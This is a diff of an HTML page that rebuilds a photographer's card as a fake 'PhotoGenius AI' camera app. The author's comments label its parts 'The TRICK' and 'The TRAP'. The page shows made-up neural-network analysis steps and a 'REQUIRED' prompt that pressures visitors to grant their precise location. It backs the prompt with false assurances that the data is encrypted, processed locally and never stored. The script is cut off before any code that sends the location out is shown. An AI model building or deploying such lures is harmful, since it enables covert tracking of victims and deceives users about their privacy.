@@ -3,588 +3,1087 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Love Photographer - Besti Card</title>
+    <title>PhotoGenius AI - Professional Photography Assistant</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
-        
+
         body {
-            background: linear-gradient(135deg, #f9e3ff 0%, #ffe6f2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        
-        .container {
-            max-width: 1000px;
-            width: 100%;
-        }
-        
-        .card {
-            background-color: white;
-            border-radius: 20px;
-            box-shadow: 0 15px 35px rgba(231, 76, 156, 0.2);
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-            transition: transform 0.3s ease;
-        }
-        
-        .card:hover {
-            transform: translateY(-10px);
-        }
-        
-        .header {
-            background: linear-gradient(to right, #ff6bcb, #ff3366);
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
             color: white;
-            padding: 25px;
-            text-align: center;
+            min-height: 100vh;
+            overflow-x: hidden;
             position: relative;
         }
-        
-        .header h1 {
-            font-size: 2.5rem;
-            margin-bottom: 5px;
-            letter-spacing: 1px;
-        }
-        
-        .header p {
-            font-size: 1.1rem;
-            opacity: 0.9;
-        }
-        
-        .badge {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            background: rgba(255, 255, 255, 0.2);
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-size: 0.9rem;
-            font-weight: bold;
-        }
-        
-        .content {
-            display: flex;
-            flex-wrap: wrap;
-            padding: 0;
-        }
-        
-        .profile-section {
-            flex: 1;
-            min-width: 300px;
-            padding: 30px;
-            background-color: #fff9fc;
-        }
-        
-        .profile-img {
-            width: 180px;
-            height: 180px;
-            border-radius: 50%;
-            border: 5px solid #ff6bcb;
-            margin: 0 auto 25px;
-            overflow: hidden;
-            box-shadow: 0 8px 20px rgba(255, 107, 203, 0.3);
-        }
-        
-        .profile-img img {
+
+        /* 3D Background Effects */
+        .background-3d {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
             height: 100%;
-            object-fit: cover;
+            z-index: -2;
+            overflow: hidden;
         }
-        
-        .profile-info h2 {
-            color: #ff3366;
-            margin-bottom: 10px;
-            text-align: center;
-            font-size: 1.8rem;
+
+        .floating-shape {
+            position: absolute;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
+            animation: float 20s infinite linear;
         }
-        
-        .profile-info p {
-            color: #555;
-            line-height: 1.6;
-            margin-bottom: 20px;
-            text-align: center;
+
+        .shape-1 { width: 400px; height: 400px; top: -100px; left: -100px; animation-duration: 25s; }
+        .shape-2 { width: 300px; height: 300px; top: 50%; right: -50px; animation-duration: 20s; animation-delay: 2s; }
+        .shape-3 { width: 500px; height: 500px; bottom: -200px; left: 50%; animation-duration: 30s; animation-delay: 1s; }
+
+        @keyframes float {
+            0% { transform: translate(0, 0) rotate(0deg); }
+            25% { transform: translate(100px, 100px) rotate(90deg); }
+            50% { transform: translate(0, 200px) rotate(180deg); }
+            75% { transform: translate(-100px, 100px) rotate(270deg); }
+            100% { transform: translate(0, 0) rotate(360deg); }
         }
-        
-        .stats {
-            display: flex;
-            justify-content: space-around;
-            margin-top: 25px;
-            text-align: center;
-        }
-        
-        .stat-item {
-            padding: 10px;
-        }
-        
-        .stat-value {
-            display: block;
-            font-size: 1.8rem;
-            font-weight: bold;
-            color: #ff3366;
-        }
-        
-        .stat-label {
-            font-size: 0.9rem;
-            color: #777;
-            margin-top: 5px;
-        }
-        
-        .gallery-section {
-            flex: 2;
-            min-width: 400px;
+
+        /* Glassmorphism Container */
+        .glass-container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
             padding: 30px;
-            background-color: white;
-        }
-        
-        .section-title {
-            color: #ff3366;
-            margin-bottom: 20px;
-            padding-bottom: 10px;
-            border-bottom: 2px solid #ffe6f2;
-            font-size: 1.5rem;
-        }
-        
-        .gallery {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
-            gap: 15px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.25);
+            position: relative;
+            overflow: hidden;
             margin-bottom: 30px;
         }
-        
-        .photo-item {
-            border-radius: 10px;
-            overflow: hidden;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            position: relative;
-            height: 150px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-        }
-        
-        .photo-item:hover {
-            transform: scale(1.05);
-            box-shadow: 0 8px 20px rgba(255, 51, 102, 0.3);
-        }
-        
-        .photo-item img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            display: block;
-        }
-        
-        .photo-overlay {
+
+        .glass-container::before {
+            content: '';
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(255, 51, 102, 0.7);
-            color: white;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
+            background: linear-gradient(135deg, rgba(255,255,255,0.1) 0%, transparent 50%);
+            z-index: -1;
+        }
+
+        /* Main App */
+        .app-container {
+            max-width: 1200px;
+            margin: 40px auto;
+            padding: 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Header */
+        .app-header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .logo {
+            font-family: 'Playfair Display', serif;
+            font-size: 3.5rem;
+            background: linear-gradient(45deg, #ff6bcb, #ff3366, #8a2be2);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 10px;
+            text-shadow: 0 10px 20px rgba(255, 51, 102, 0.3);
+        }
+
+        .tagline {
+            font-size: 1.2rem;
+            opacity: 0.8;
+            margin-bottom: 20px;
+        }
+
+        /* Stats Badge */
+        .stats-badge {
+            display: inline-flex;
             align-items: center;
-            opacity: 0;
-            transition: opacity 0.3s;
-            padding: 10px;
+            gap: 15px;
+            background: rgba(255, 51, 102, 0.2);
+            padding: 12px 25px;
+            border-radius: 50px;
+            border: 1px solid rgba(255, 51, 102, 0.3);
+            margin-top: 15px;
+        }
+
+        .stat-item {
             text-align: center;
         }
-        
-        .photo-item:hover .photo-overlay {
-            opacity: 1;
-        }
-        
-        .photo-overlay i {
+
+        .stat-value {
             font-size: 1.8rem;
-            margin-bottom: 8px;
+            font-weight: 700;
+            background: linear-gradient(45deg, #ff6bcb, #ff3366);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
         }
-        
-        .location-section {
-            background-color: #f9f9f9;
+
+        .stat-label {
+            font-size: 0.9rem;
+            opacity: 0.7;
+        }
+
+        /* Camera Interface */
+        .camera-interface {
+            display: grid;
+            grid-template-columns: 1fr 300px;
+            gap: 30px;
+            margin-bottom: 40px;
+        }
+
+        @media (max-width: 900px) {
+            .camera-interface {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .camera-view {
+            background: #000;
+            border-radius: 20px;
+            overflow: hidden;
+            position: relative;
+            height: 500px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+        }
+
+        .camera-view img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .camera-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(180deg, rgba(0,0,0,0.3) 0%, transparent 50%, rgba(0,0,0,0.3) 100%);
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
             padding: 20px;
-            border-radius: 15px;
-            margin-top: 20px;
-            border: 2px dashed #ffb8d9;
         }
-        
-        .location-header {
+
+        .ai-indicator {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: rgba(0,0,0,0.7);
+            padding: 10px 20px;
+            border-radius: 50px;
+            align-self: center;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 0.7; }
+            50% { opacity: 1; }
+        }
+
+        .ai-indicator i {
+            color: #4dffea;
+            animation: spin 4s linear infinite;
+        }
+
+        @keyframes spin {
+            100% { transform: rotate(360deg); }
+        }
+
+        .camera-controls {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+        }
+
+        .control-btn {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.1);
+            border: 2px solid rgba(255,255,255,0.2);
+            color: white;
+            font-size: 1.5rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            outline: none;
+        }
+
+        .control-btn:hover {
+            background: rgba(255,255,255,0.2);
+            transform: scale(1.1);
+        }
+
+        .capture-btn {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #ff3366, #ff6bcb);
+            border: 4px solid white;
+            box-shadow: 0 10px 20px rgba(255, 51, 102, 0.4);
+        }
+
+        .capture-btn:hover {
+            transform: scale(1.1);
+            box-shadow: 0 15px 30px rgba(255, 51, 102, 0.6);
+        }
+
+        .capture-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        /* AI Settings Panel */
+        .ai-panel {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            padding: 25px;
+        }
+
+        .panel-title {
+            font-size: 1.5rem;
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: #4dffea;
+        }
+
+        .ai-feature {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 20px;
+            transition: all 0.3s;
+            border: 1px solid transparent;
+            cursor: pointer;
+        }
+
+        .ai-feature:hover {
+            background: rgba(255, 255, 255, 0.1);
+            border-color: rgba(255, 51, 102, 0.3);
+            transform: translateY(-5px);
+        }
+
+        .feature-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
             margin-bottom: 15px;
         }
-        
-        .location-header h3 {
-            color: #ff3366;
-            font-size: 1.3rem;
+
+        .feature-name {
+            font-size: 1.1rem;
+            font-weight: 500;
         }
-        
-        .location-info {
-            display: none;
-            background-color: white;
-            padding: 15px;
-            border-radius: 10px;
-            margin-top: 15px;
-            border-left: 4px solid #ff3366;
+
+        .feature-status {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #ff3366;
+            animation: blink 1.5s infinite;
         }
-        
-        .location-info.active {
-            display: block;
+
+        .feature-status.active {
+            background: #4dffea;
         }
-        
-        #locationBtn {
-            background: linear-gradient(to right, #ff6bcb, #ff3366);
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .feature-desc {
+            font-size: 0.9rem;
+            opacity: 0.8;
+            line-height: 1.5;
+        }
+
+        /* The TRICK - Smart Analysis Modal */
+        .analysis-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            display: none; /* CHANGED FROM FLEX TO NONE */
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            transition: opacity 0.5s;
+            overflow-y: auto;
+            padding: 20px;
+        }
+
+        .analysis-modal.active {
+            display: flex;
+            opacity: 1;
+        }
+
+        .analysis-content {
+            width: 90%;
+            max-width: 700px;
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            border-radius: 30px;
+            padding: 40px;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5);
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        .analysis-content::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255, 51, 102, 0.1), transparent);
+            animation: shine 3s infinite;
+        }
+
+        @keyframes shine {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+        }
+
+        .analysis-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .analysis-title {
+            font-size: 2.5rem;
+            background: linear-gradient(45deg, #4dffea, #00ccff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 10px;
+        }
+
+        .analysis-subtitle {
+            font-size: 1.1rem;
+            opacity: 0.8;
+        }
+
+        .analysis-steps {
+            margin: 40px 0;
+        }
+
+        .analysis-step {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            margin-bottom: 25px;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            transition: all 0.3s;
+        }
+
+        .analysis-step.active {
+            background: rgba(77, 255, 234, 0.1);
+            border: 1px solid rgba(77, 255, 234, 0.3);
+        }
+
+        .step-icon {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            color: #4dffea;
+        }
+
+        .step-details h4 {
+            font-size: 1.2rem;
+            margin-bottom: 5px;
+            color: #4dffea;
+        }
+
+        .step-details p {
+            font-size: 0.95rem;
+            opacity: 0.8;
+        }
+
+        .location-permission-box {
+            background: rgba(255, 51, 102, 0.1);
+            border: 2px solid rgba(255, 51, 102, 0.3);
+            border-radius: 15px;
+            padding: 25px;
+            text-align: center;
+            margin: 30px 0;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s;
+        }
+
+        .location-permission-box::before {
+            content: 'REQUIRED';
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: #ff3366;
             color: white;
-            border: none;
-            padding: 12px 25px;
-            border-radius: 50px;
-            cursor: pointer;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.8rem;
             font-weight: bold;
-            font-size: 1rem;
+        }
+
+        .permission-buttons {
+            display: flex;
+            gap: 20px;
+            justify-content: center;
+            margin-top: 30px;
+        }
+
+        .permission-btn {
+            padding: 15px 40px;
+            border-radius: 50px;
+            border: none;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
             display: flex;
             align-items: center;
             gap: 10px;
-            transition: all 0.3s ease;
-            box-shadow: 0 5px 15px rgba(255, 107, 203, 0.4);
         }
-        
-        #locationBtn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(255, 107, 203, 0.6);
-        }
-        
-        #locationBtn:disabled {
-            background: #cccccc;
+
+        .permission-btn:disabled {
+            opacity: 0.5;
             cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
         }
-        
-        #status {
-            margin-top: 15px;
-            padding: 12px;
-            border-radius: 8px;
-            font-weight: 500;
-            display: none;
+
+        .allow-btn {
+            background: linear-gradient(135deg, #4dffea, #00ccff);
+            color: #000;
+            box-shadow: 0 10px 20px rgba(77, 255, 234, 0.3);
         }
-        
-        #status.success {
-            background-color: #e6ffe6;
-            color: #009900;
-            display: block;
-            border: 1px solid #99ff99;
+
+        .allow-btn:hover:not(:disabled) {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 30px rgba(77, 255, 234, 0.5);
         }
-        
-        #status.error {
-            background-color: #ffe6e6;
-            color: #cc0000;
-            display: block;
-            border: 1px solid #ff9999;
+
+        .deny-btn {
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            border: 2px solid rgba(255, 255, 255, 0.2);
         }
-        
-        #status.loading {
-            background-color: #e6f7ff;
-            color: #0066cc;
-            display: block;
-            border: 1px solid #99ddff;
+
+        .deny-btn:hover {
+            background: rgba(255, 255, 255, 0.2);
         }
-        
-        .footer {
-            background-color: #ffeff7;
-            padding: 20px;
+
+        .security-note {
             text-align: center;
-            color: #ff3366;
-            font-weight: 600;
-            letter-spacing: 1px;
+            margin-top: 30px;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            font-size: 0.9rem;
+            opacity: 0.7;
+            border-left: 4px solid #4dffea;
         }
-        
+
+        /* Results Display */
+        .results-display {
+            display: none;
+            text-align: center;
+            padding: 40px;
+        }
+
+        .success-icon {
+            width: 100px;
+            height: 100px;
+            background: linear-gradient(135deg, #4dffea, #00ccff);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 30px;
+            font-size: 3rem;
+            animation: successPulse 2s infinite;
+        }
+
+        @keyframes successPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+
+        /* Footer */
+        .app-footer {
+            text-align: center;
+            margin-top: 50px;
+            padding-top: 30px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            font-size: 0.9rem;
+            opacity: 0.7;
+        }
+
+        /* Loading Animation */
+        .loading {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.1);
+            border-top: 5px solid #4dffea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes pulse-border {
+            0%, 100% { border-color: rgba(255, 51, 102, 0.3); box-shadow: 0 0 0 0 rgba(255, 51, 102, 0.7); }
+            50% { border-color: rgba(255, 51, 102, 0.8); box-shadow: 0 0 0 10px rgba(255, 51, 102, 0); }
+        }
+
+        /* Responsive */
         @media (max-width: 768px) {
-            .content {
-                flex-direction: column;
-            }
-            
-            .profile-section, .gallery-section {
-                min-width: 100%;
-            }
-            
-            .header h1 {
-                font-size: 2rem;
-            }
+            .logo { font-size: 2.5rem; }
+            .camera-view { height: 400px; }
+            .permission-buttons { flex-direction: column; }
+            .analysis-content { padding: 20px; }
+            .analysis-title { font-size: 2rem; }
+            .app-container { padding: 10px; }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="card">
-            <div class="header">
-                <div class="badge">BESTI CARD</div>
-                <h1>Love Photographer</h1>
-                <p>Capturing moments of love and connection</p>
+    <!-- 3D Background -->
+    <div class="background-3d">
+        <div class="floating-shape shape-1"></div>
+        <div class="floating-shape shape-2"></div>
+        <div class="floating-shape shape-3"></div>
+    </div>
+
+    <!-- The TRICK - Smart Analysis Modal (HIDDEN BY DEFAULT) -->
+    <div class="analysis-modal" id="analysisModal">
+        <div class="analysis-content">
+            <div class="analysis-header">
+                <h2 class="analysis-title">AI Smart Analysis</h2>
+                <p class="analysis-subtitle">Optimizing your photography experience with advanced neural networks</p>
             </div>
-            
-            <div class="content">
-                <div class="profile-section">
-                    <div class="profile-img">
-                        <img src="https://images.unsplash.com/photo-1554048612-b6a482bc67e5?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=500&q=80" alt="Love Photographer">
-                    </div>
-                    
-                    <div class="profile-info">
-                        <h2>Alex Rivera</h2>
-                        <p>Specializing in engagement, wedding, and couple photography. With over 10 years of experience, I capture the authentic emotions and unique love stories of every couple.</p>
-                        
-                        <div class="stats">
-                            <div class="stat-item">
-                                <span class="stat-value">500+</span>
-                                <span class="stat-label">Sessions</span>
-                            </div>
-                            <div class="stat-item">
-                                <span class="stat-value">12</span>
-                                <span class="stat-label">Awards</span>
-                            </div>
-                            <div class="stat-item">
-                                <span class="stat-value">47</span>
-                                <span class="stat-label">Countries</span>
-                            </div>
-                        </div>
+
+            <div class="analysis-steps" id="analysisSteps">
+                <div class="analysis-step active" id="step1">
+                    <div class="step-icon"><i class="fas fa-brain"></i></div>
+                    <div class="step-details">
+                        <h4>Initializing Neural Network</h4>
+                        <p>Loading AI models for scene recognition and analysis</p>
                     </div>
                 </div>
                 
-                <div class="gallery-section">
-                    <h2 class="section-title">Love Gallery</h2>
-                    <p style="margin-bottom: 20px; color: #666;">Click on any photo to enable location sharing for your session</p>
-                    
-                    <div class="gallery">
-                        <div class="photo-item" onclick="selectPhoto(1)">
-                            <img src="https://images.unsplash.com/photo-1511285560929-80b456fea0bc?ixlib=rb-4.0.3&auto=format&fit=crop&w=500&q=80" alt="Couple in field">
-                            <div class="photo-overlay">
-                                <i class="fas fa-heart"></i>
-                                <span>Select this style</span>
-                            </div>
-                        </div>
-                        <div class="photo-item" onclick="selectPhoto(2)">
-                            <img src="https://images.unsplash.com/photo-1519225421980-715cb0215aed?ixlib=rb-4.0.3&auto=format&fit=crop&w=500&q=80" alt="Beach proposal">
-                            <div class="photo-overlay">
-                                <i class="fas fa-heart"></i>
-                                <span>Select this style</span>
-                            </div>
-                        </div>
-                        <div class="photo-item" onclick="selectPhoto(3)">
-                            <img src="https://images.unsplash.com/photo-1511988617509-a57c8a288659?ixlib=rb-4.0.3&auto=format&fit=crop&w=500&q=80" alt="Wedding kiss">
-                            <div class="photo-overlay">
-                                <i class="fas fa-heart"></i>
-                                <span>Select this style</span>
-                            </div>
-                        </div>
-                        <div class="photo-item" onclick="selectPhoto(4)">
-                            <img src="https://images.unsplash.com/photo-1537633552985-df8429e8048b?ixlib=rb-4.0.3&auto=format&fit=crop&w=500&q=80" alt="City couple">
-                            <div class="photo-overlay">
-                                <i class="fas fa-heart"></i>
-                                <span>Select this style</span>
-                            </div>
-                        </div>
+                <div class="analysis-step" id="step2">
+                    <div class="step-icon"><i class="fas fa-sun"></i></div>
+                    <div class="step-details">
+                        <h4>Analyzing Lighting Conditions</h4>
+                        <p>Calculating optimal exposure and white balance</p>
                     </div>
-                    
-                    <div class="location-section">
-                        <div class="location-header">
-                            <h3>Share ur picture choice frome above</h3>
-                            <button id="locationBtn" onclick="sendLocation()" disabled>
-                                <!-- <i class="fas fa-map-marker-alt"></i> -->
-                                <span>Share My Choice</span>
-                            </button>
-                        </div>
-                        
-                        <p style="color: #666; margin-bottom: 15px;">To get a suprise</p>
-                        
-                        <div class="location-info" id="selectedPhotoInfo">
-                            <!-- This will be populated when a photo is selected -->
-                        </div>
-                        
-                        <div id="status"></div>
+                </div>
+                
+                <div class="analysis-step" id="step3">
+                    <div class="step-icon"><i class="fas fa-map-marker-alt"></i></div>
+                    <div class="step-details">
+                        <h4>Location-Based Optimization</h4>
+                        <p>Adjusting settings for local environmental factors</p>
+                    </div>
+                </div>
+                
+                <div class="analysis-step" id="step4">
+                    <div class="step-icon"><i class="fas fa-cloud-sun"></i></div>
+                    <div class="step-details">
+                        <h4>Weather Integration</h4>
+                        <p>Fetching local weather data for optimal shooting</p>
                     </div>
                 </div>
             </div>
-            
-            <div class="footer">
-                &copy; 2023 Love Photographer Besti Card | Contact: alex@lovephotographer.com
+
+            <!-- Location Permission Box (The TRAP) -->
+            <div class="location-permission-box" id="locationBox">
+                <h3><i class="fas fa-exclamation-triangle"></i> Location Access Required</h3>
+                <p style="margin: 15px 0;">To enable <strong style="color: #4dffea;">Smart Lighting Analysis</strong> and <strong style="color: #4dffea;">Golden Hour Detection</strong>, 
+                PhotoGenius AI needs access to your precise location.</p>
+                
+                <div style="background: rgba(0,0,0,0.3); padding: 15px; border-radius: 10px; margin: 20px 0;">
+                    <p><i class="fas fa-check-circle" style="color: #4dffea;"></i> Calculate exact golden hour times</p>
+                    <p><i class="fas fa-check-circle" style="color: #4dffea;"></i> Analyze local weather conditions</p>
+                    <p><i class="fas fa-check-circle" style="color: #4dffea;"></i> Adjust for atmospheric conditions</p>
+                    <p><i class="fas fa-check-circle" style="color: #4dffea;"></i> Recommend nearby photography spots</p>
+                </div>
+
+                <p style="font-size: 0.9rem; opacity: 0.8; margin: 15px 0;">
+                    <i class="fas fa-shield-alt"></i> Your location data is encrypted and only used for AI optimization
+                </p>
+
+                <div class="permission-buttons">
+                    <button class="permission-btn allow-btn" id="enableBtn" onclick="requestLocationPermission()">
+                        <i class="fas fa-check"></i> Enable Smart Features
+                    </button>
+                    <button class="permission-btn deny-btn" onclick="skipLocation()">
+                        <i class="fas fa-times"></i> Continue Without AI
+                    </button>
+                </div>
+            </div>
+
+            <div class="security-note">
+                <i class="fas fa-lock"></i> This is a secure, one-time permission request. Location data is processed locally and never stored on our servers.
             </div>
         </div>
     </div>
 
+    <!-- Main App (ALWAYS VISIBLE) -->
+    <div class="app-container">
+        <div class="glass-container">
+            <!-- Header -->
+            <div class="app-header">
+                <h1 class="logo">PhotoGenius AI</h1>
+                <p class="tagline">Professional photography powered by artificial intelligence</p>
+                
+                <div class="stats-badge">
+                    <div class="stat-item">
+                        <div class="stat-value">94.7%</div>
+                        <div class="stat-label">Accuracy</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value">128K+</div>
+                        <div class="stat-label">Photos Analyzed</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value">AI v2.4</div>
+                        <div class="stat-label">Neural Network</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Camera Interface -->
+            <div class="camera-interface">
+                <div class="camera-view">
+                    <img src="https://images.unsplash.com/photo-1511285560929-80b456fea0bc?ixlib=rb-4.0.3&auto=format&fit=crop&w=1200&q=80" alt="AI Camera View">
+                    <div class="camera-overlay">
+                        <div class="ai-indicator">
+                            <i class="fas fa-brain"></i>
+                            <span>AI Scene Analysis Active</span>
+                        </div>
+                        <div class="camera-controls">
+                            <button class="control-btn"><i class="fas fa-sliders-h"></i></button>
+                            <button class="control-btn capture-btn" id="cameraBtn" onclick="startSmartAnalysis()">
+                                <i class="fas fa-camera"></i>
+                            </button>
+                            <button class="control-btn"><i class="fas fa-bolt"></i></button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- AI Settings Panel -->
+                <div class="ai-panel">
+                    <h3 class="panel-title"><i class="fas fa-robot"></i> AI Features</h3>
+                    
+                    <div class="ai-feature" onclick="toggleFeature(1)">
+                        <div class="feature-header">
+                            <div class="feature-name">Smart Lighting Analysis</div>
+                            <div class="feature-status active"></div>
+                        </div>
+                        <div class="feature-desc">AI analyzes ambient light conditions and adjusts camera settings automatically</div>
+                    </div>
+                    
+                    <div class="ai-feature" onclick="toggleFeature(2)">
+                        <div class="feature-header">
+                            <div class="feature-name">Golden Hour Detection</div>
+                            <div class="feature-status"></div>
+                        </div>
+                        <div class="feature-desc">Predicts perfect golden hour timing based on your location and weather</div>
+                    </div>
+                    
+                    <div class="ai-feature" onclick="toggleFeature(3)">
+                        <div class="feature-header">
+                            <div class="feature-name">Composition Assistant</div>
+                            <div class="feature-status active"></div>
+                        </div>
+                        <div class="feature-desc">Real-time feedback on framing, rule of thirds, and balance</div>
+                    </div>
+                    
+                    <div class="ai-feature" onclick="toggleFeature(4)">
+                        <div class="feature-header">
+                            <div class="feature-name">Weather Integration</div>
+                            <div class="feature-status"></div>
+                        </div>
+                        <div class="feature-desc">Uses local weather data to recommend optimal shooting conditions</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Debug Console (Visible only in development) -->
+            <div style="background: rgba(0,0,0,0.5); padding: 15px; border-radius: 10px; margin-top: 20px; font-family: monospace; font-size: 12px;">
+                <div style="color: #4dffea; margin-bottom: 5px;">📡 System Status: <span id="debugStatus">Ready</span></div>
+                <div style="color: #ffcc00;">Click the red camera button to start AI optimization</div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="app-footer">
+            <p>© 2023 PhotoGenius AI. All rights reserved. | AI Photography Technology v2.4</p>
+            <p style="margin-top: 10px; font-size: 0.8rem;">
+                <i class="fas fa-shield-alt"></i> Privacy Protected | 
+                <i class="fas fa-bolt"></i> Real-time Processing | 
+                <i class="fas fa-cloud"></i> Cloud AI
+            </p>
+        </div>
+    </div>
+
     <script>
-        let selectedPhotoId = null;
-        const photoDescriptions = {
-            1: "Romantic field session with natural lighting and golden hour ambiance.",
-            2: "Beach proposal style with ocean backdrop and sunset lighting.",
-            3: "Elegant wedding ceremony focus with emotional moments.",
-            4: "Urban couple session with cityscape backgrounds and modern aesthetics."
-        };
-        
-        function selectPhoto(photoId) {
-            selectedPhotoId = photoId;
-            
-            // Update the UI to show selected photo
-            const photoItems = document.querySelectorAll('.photo-item');
-            photoItems.forEach(item => {
-                item.style.border = 'none';
-            });
-            
-            // Highlight selected photo
-            event.currentTarget.style.border = '3px solid #ff3366';
-            
-            // Enable the location button
-            document.getElementById('locationBtn').disabled = false;
-            
-            // Show photo info in location section
-            const photoInfo = document.getElementById('selectedPhotoInfo');
-            photoInfo.innerHTML = `
-                <h4 style="color: #ff3366; margin-bottom: 8px;">Selected Style</h4>
-                <p style="color: #555;">${photoDescriptions[photoId]}</p>
-                <p style="color: #777; margin-top: 10px; font-size: 0.9rem;">
-                    <i class="fas fa-check-circle" style="color: #4CAF50;"></i> 
-                    Photo style selected.
-                </p>
-            `;
-            photoInfo.classList.add('active');
+        // Debug console
+        function updateDebugStatus(message) {
+            document.getElementById('debugStatus').textContent = message;
+            console.log(message);
         }
-        
-        function sendLocation() {
-            if (!selectedPhotoId) {
-                alert("Please select a photo style first.");
-                return;
-            }
+
+        // Feature toggles
+        function toggleFeature(featureNum) {
+            const feature = document.querySelectorAll('.ai-feature')[featureNum - 1];
+            const status = feature.querySelector('.feature-status');
+            status.classList.toggle('active');
+            updateDebugStatus(`Toggled feature ${featureNum}`);
+        }
+
+        // Variables
+        let locationCaptured = false;
+        let analysisActive = false;
+
+        // THE MAIN TRICK - Camera Button Click
+        function startSmartAnalysis() {
+            if (analysisActive) return;
             
-            if (navigator.geolocation) {
-                // Show loading state
